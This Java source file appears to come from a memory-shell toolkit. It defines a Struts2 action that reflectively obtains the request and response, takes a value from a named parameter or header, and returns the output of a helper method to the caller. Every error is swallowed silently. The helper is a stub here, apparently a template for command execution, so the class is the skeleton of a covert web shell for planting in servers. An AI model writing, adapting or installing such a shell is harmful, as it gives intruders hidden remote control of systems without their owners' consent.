package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/12/8
 */
public class CommandStruct2Action {
    private static String paramName;

    public String execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                response.getWriter().println(new Scanner(inputStream).useDelimiter("\\A").next());
                response.getWriter().flush();
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
